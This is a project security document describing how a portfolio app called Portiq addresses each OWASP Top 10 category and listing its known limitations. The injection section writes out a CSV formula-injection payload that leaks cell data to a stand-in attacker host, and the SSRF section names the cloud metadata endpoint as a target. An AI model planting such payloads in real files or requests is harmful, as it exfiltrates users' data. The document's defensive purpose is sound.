# Security

How Portiq addresses the OWASP Top 10 (2021), what each control actually does, and where it lives.

Portiq is a single-owner portfolio application. It holds financial holdings, purchase prices and
dates, reachable through one login. That shapes the priorities below: there is no multi-tenant data
to segregate, but there is a single account worth guessing at, an encrypted store worth protecting,
and three separate paths by which attacker-supplied files reach a parser.

---

## A01 — Broken Access Control

| Control | Where |
|---|---|
| Deny by default: every endpoint needs a token unless explicitly listed | `config/SecurityConfig.java` |
| Only the login endpoints are public — `/api/auth/**` used to be public wholesale | `config/SecurityConfig.java` |
| H2 console route only registered when the console is actually enabled | `config/SecurityConfig.java` |
| Swagger UI and the OpenAPI document require a session in prod | `app.security.docs.public` |
| CORS is an explicit origin list; `*` is rejected at startup | `config/SecurityConfig.java` |
| Unauthenticated requests get a JSON 401, not a bare 403 | `security/JsonAuthenticationEntryPoint.java` |

`anyRequest().authenticated()` means an endpoint added next month is protected because nobody had
to remember to protect it.

The `/api/auth/**` change fixed a real bug as well as a hole: `/api/auth/me` and the WebAuthn
registration endpoints took an `Authentication` parameter but sat under a blanket `permitAll`, so an
unauthenticated call dereferenced null and came back as a 500.

## A02 — Cryptographic Failures

| Control | Where |
|---|---|
| AES-GCM field encryption on holdings columns, random IV per value | `security/Encrypted*Converter.java` |
| BCrypt at cost 12 for the account password | `config/SecurityConfig.java` |
| Startup refuses production without a real JWT secret and encryption key | `config/StartupSecurityValidator.java` |
| TLS to the database on by default | `application-prod.properties`, `application-supabase.properties` |
| HSTS, one year, including subdomains | `config/SecurityConfig.java` |
| The model API endpoint must be https — the key rides on every request | `service/ChatCompletionClient.java` |

The database URL previously carried `useSSL=false&allowPublicKeyRetrieval=true`, which sent
credentials and every decrypted holding across the network in the clear and let a man-in-the-middle
supply its own key during password exchange. Both are now off; `DB_SSL_MODE=DISABLED` exists as a
temporary escape hatch for a database with no certificate yet.

## A03 — Injection

Persistence is Spring Data JPA throughout, with no native queries or string-built SQL, so classic
SQL injection has no entry point. The injection risks that *do* exist here are the less obvious
ones:

| Control | Where |
|---|---|
| Ticker constrained to a real-symbol pattern before storage | `dto/HoldingRequest.java` |
| CSV formula injection neutralised in exports | `service/ExportService.java` |
| Feed links restricted to http(s) before they reach an `href` | `service/RssFeedFetcher.java`, `components/news/NewsList.jsx` |
| XML parsed with DOCTYPE, external entities and XInclude all disabled | `service/RssFeedFetcher.java` |
| Log values stripped of control characters | `security/SecurityAuditLogger.java` |

**CSV formula injection** is the one most easily missed. A holding named
`=HYPERLINK("http://attacker/"&A1,"Click")` is inert JSON in the app and a live exfiltration link
the moment someone opens the export in Excel. Holding names arrive from uploaded statements, so
they are attacker-reachable even with one user. Only the two text columns are quoted — running the
same fix over the numeric columns would turn every negative gain into a string and break the
arithmetic the export exists for.

## A04 — Insecure Design

| Control | Where |
|---|---|
| Per-caller request throttling, bucketed by endpoint cost | `security/RateLimitFilter.java` |
| Temporary lockout on repeated login failures | `security/LoginAttemptService.java` |
| Row and size caps on imports | `service/HoldingImportService.java`, `service/UploadValidator.java` |
| Bounded numeric inputs | `dto/HoldingRequest.java` |

Throttling and lockout overlap deliberately, because they catch different attacks. The throttle caps
volume from one address. The lockout counts *failures* against one account, so a slow distributed
run — one attempt per address, well under any volume limit — still trips it. The lockout is
time-boxed rather than permanent: a permanent lock on a known username is a denial of service
against its owner.

## A05 — Security Misconfiguration

| Control | Where |
|---|---|
| CSP, `X-Frame-Options: DENY`, `Referrer-Policy`, `Permissions-Policy`, nosniff | `config/SecurityConfig.java` |
| No `Server` header | `application.properties` |
| Stack traces and exception messages never returned to callers | `application.properties`, `exception/GlobalExceptionHandler.java` |
| Bounded request header and form sizes | `application.properties` |
| Startup validation of the whole production posture | `config/StartupSecurityValidator.java` |

Two content security policies are served. API responses get
`default-src 'none'; frame-ancestors 'none'; sandbox` — this application returns JSON and nothing
else, so nothing needs to load. Swagger UI gets a policy permitting its own same-origin bundle, and
only when the docs are exposed at all.

`StartupSecurityValidator` is the piece worth understanding. Every development default is
convenient and every one is dangerous in production: an unset JWT secret means tokens signed with a
key that dies on restart and differs per replica; an unset encryption key means encrypted columns
become unreadable after a restart; the seeded owner password is published in this repository. Under
the `prod` profile the application refuses to start on any of them, and reports all the problems at
once. A misconfigured deployment that boots looks healthy and is found by whoever finds it first;
one that refuses to boot is found by the person deploying it, while they are still watching.

## A06 — Vulnerable and Outdated Components

OWASP Dependency-Check runs behind a Maven profile, failing the build on any CVE scoring 7 or above:

```bash
cd backend && mvn -Psecurity verify
```

Behind a profile rather than in the default build on purpose — the scan syncs a local NVD copy and
takes minutes on a cold cache, which wired into every `mvn test` gets switched off within a week.
Run it in CI and on a schedule. Set `NVD_API_KEY` (free, from nvd.nist.gov) to avoid being
rate-limited to a crawl.

## A07 — Identification and Authentication Failures

| Control | Where |
|---|---|
| Login lockout per account and per address | `security/LoginAttemptService.java` |
| Identical response and timing whether or not the username exists | `controller/AuthController.java`, `service/UserService.java` |
| Tokens carry an issuer and a unique id, verified on every request | `security/JwtService.java` |
| Logout genuinely revokes the token server-side | `security/TokenDenylist.java` |
| WebAuthn failures reveal nothing about which internal check failed | `controller/AuthController.java` |

Two details are easy to get wrong. A wrong password and an unknown username must be
*indistinguishable* — not just in the message, but in timing: an unknown username returns in
microseconds while a real one costs a full BCrypt verification, and that gap is measurable over the
network. `UserService` verifies against a dummy hash when the user does not exist so both paths cost
the same.

And logout has to be server-side. A signed JWT is valid until it expires, so deleting it from the
browser leaves a working credential in the hands of anyone who captured it. Revoked ids are held
only until the token would have expired anyway, so the list cannot grow without bound.

## A08 — Software and Data Integrity Failures

| Control | Where |
|---|---|
| Uploads checked on extension, declared type and leading bytes | `service/UploadValidator.java` |
| Imported holdings run through the same bean constraints as typed ones | `service/HoldingImportService.java` |
| Filenames reduced to their last path segment | `service/UploadValidator.java` |

Both import endpoints previously accepted whatever arrived — one branched on the filename alone, the
other base64-encoded the bytes straight into an external API call. The magic-byte check is the one
that matters most: it is what stops a renamed executable reaching Apache POI's parser under a name
and content type that both say "spreadsheet".

Validating imported holdings closes a parallel gap. CSV and model-extracted rows reached the
database on a path that skipped `@Valid` entirely, which meant the ticker pattern — the constraint
holding up the SSRF defence below — did not apply to the two sources an attacker actually controls.

## A09 — Security Logging and Monitoring Failures

All security events are written through `security/SecurityAuditLogger.java` under a dedicated
`SECURITY` logger, so they can be shipped or alerted on without sifting the application log:

```
event=LOGIN_FAILURE user=owner ip=203.0.113.5 reason=bad credentials
event=RATE_LIMITED ip=203.0.113.5 bucket=auth method=POST path=/api/auth/login
event=OUTBOUND_REQUEST_BLOCKED url=http://169.254.169.254/... reason=host resolves to an internal address
```

Two rules hold throughout. No secret is ever passed in — only that a credential was presented and
whether it was accepted. And every caller-supplied value is stripped of control characters first,
because a username containing a newline would otherwise forge extra log lines and bury the attacker's
own trail. Client IP logging can be turned off (`app.security.audit.log-client-ip`) where retaining
it is a data-protection problem.

## A10 — Server-Side Request Forgery

| Control | Where |
|---|---|
| Host allowlist plus internal-address block on every outbound call | `security/OutboundUrlGuard.java` |
| Tickers URL-encoded into their path segment | `MarketDataFetcher`, `PriceLookupService`, `PriceSeriesFetcher` |
| Redirects not followed | `config/HttpClientConfig.java` |
| Connect and read timeouts on all outbound HTTP | `config/HttpClientConfig.java` |

This is the risk that most repays attention here, because the URLs Portiq fetches are *built from
stored tickers* — and tickers arrive from a CSV and from a model reading an uploaded screenshot, not
only from a form anyone eyeballs. Three layers apply: the ticker pattern stops a hostile value being
stored at all, encoding pins it inside one path segment, and the guard checks the assembled URL
against an allowlist and refuses loopback, private and link-local addresses — the last of which
covers `169.254.169.254`, the cloud metadata endpoint whose response is a set of instance
credentials.

Not following redirects matters just as much as the allowlist. With the host pinned but redirects
followed, a `302` from that host would be followed anywhere. And the missing timeouts were arguably
the more likely problem in practice: a dashboard load fans out one request per holding, so one
upstream that accepts connections and stops responding was enough to exhaust the thread pool.

---

## Configuration

Every control is configurable; the defaults are the safe ones. See `.env.prod.example` for the full
list. The settings most worth reviewing per deployment:

| Variable | Default | Notes |
|---|---|---|
| `CORS_ALLOWED_ORIGINS` | localhost + the Vercel app | Explicit list; `*` is refused at startup |
| `OUTBOUND_ALLOWED_HOSTS` | Yahoo + Google News | Anything else is refused before connecting |
| `TRUST_PROXY` | `false` (`true` in prod) | **Only** true behind a proxy that overwrites `X-Forwarded-For`. On a directly exposed server this lets a caller forge a new identity per request and slip every per-IP limit |
| `DOCS_PUBLIC` | `true` (`false` in prod) | Swagger describes every endpoint and payload |
| `LOGIN_MAX_FAILURES` | 5 | Per account, per lockout window |
| `JWT_EXPIRY_HOURS` | 12 | Ceiling on a captured token that is never logged out |

## Known limitations

Stated plainly, because a security document that claims completeness is not useful.

- **Rate limits and the logout denylist are per instance.** Both are in-memory. Two replicas each
  allow the configured rate, and a logout only revokes on the instance that served it. Multi-replica
  deployment needs a shared store (Redis) for both.
- **Fixed windows allow a 2× burst.** Up to twice the limit can pass across a window boundary. The
  goal is making bulk guessing expensive, not metering precisely.
- **The session token is held in `localStorage`.** Any XSS in the frontend can read it. The CSP and
  the `href` sanitisation reduce the chance of XSS, but a `httpOnly` cookie would remove this class
  of risk entirely — at the cost of needing CSRF protection back, which the current header-based
  scheme does not require. Worth revisiting, not a change to make casually.
- **`OutboundUrlGuard` checks literal addresses, not DNS.** Resolving here would check a different
  answer from the one the connection later uses (DNS rebinding) and add a round trip to every call.
  The allowlist is what actually pins the destination.
- **No automated dependency scanning in CI yet.** The tooling is wired up (`mvn -Psecurity verify`);
  scheduling it is a pipeline change, not a code change.

## Running the security tests

```bash
cd backend && mvn test          # 238 tests, 119 of them covering the controls above
cd backend && mvn -Psecurity verify   # dependency CVE scan
```

The integration tests in `src/test/java/com/portiq/security/` are the ones that would catch a future
change quietly reopening a hole — including `RateLimitChainIntegrationTest`, which exists because a
filter that is registered in the wrong position fails silently: every request succeeds, which is
exactly what a passing test suite looks like.
